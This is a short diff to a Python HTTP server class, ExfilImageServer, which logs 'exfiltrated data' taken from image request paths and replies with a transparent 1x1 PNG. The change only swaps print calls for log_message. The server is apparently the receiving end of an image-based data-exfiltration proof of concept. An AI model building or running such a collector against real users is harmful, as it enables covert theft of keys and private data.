@@ -20,11 +20,11 @@ class ExfilImageServer(BaseHTTPRequestHandler):
                 width = parts[3] if len(parts) > 3 else "500"
                 height = parts[4] if len(parts) > 4 else "300"
 
-                print(f"\n[!] Exfiltrated data received:")
-                print(f"    Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
-                print(f"    Data: {cle_pub}")
-                print(f"    Dimensions: {width}x{height}")
-                print(f"    User-Agent: {self.headers.get('User-Agent')}")
+                self.log_message("[!] Exfiltrated data received:")
+                self.log_message("    Timestamp: %s", time.strftime('%Y-%m-%d %H:%M:%S'))
+                self.log_message("    Data: %s", cle_pub)
+                self.log_message("    Dimensions: %sx%s", width, height)
+                self.log_message("    User-Agent: %s", self.headers.get('User-Agent'))
 
                 # PNG 1x1 transparent
                 self.send_response(200)
